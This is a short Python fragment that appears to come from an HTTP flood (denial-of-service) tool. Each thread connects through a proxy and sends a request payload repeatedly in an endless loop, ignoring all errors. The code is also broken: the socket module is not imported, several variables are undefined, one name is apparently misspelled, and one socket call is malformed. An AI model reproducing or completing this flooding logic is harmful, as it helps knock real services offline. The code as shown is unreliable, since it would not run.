import threading


class RequestProxyHTTP(threading.Thread):

    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        go.wait()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(proxy_ip), int(proxy_part)))
                s.send("Reqeust is sent: ", self.counter)
                try:
                    for y in range(50):
                        s.send(str.encode(request.cf))
                except:
                    s.close()
            except:
                s.close()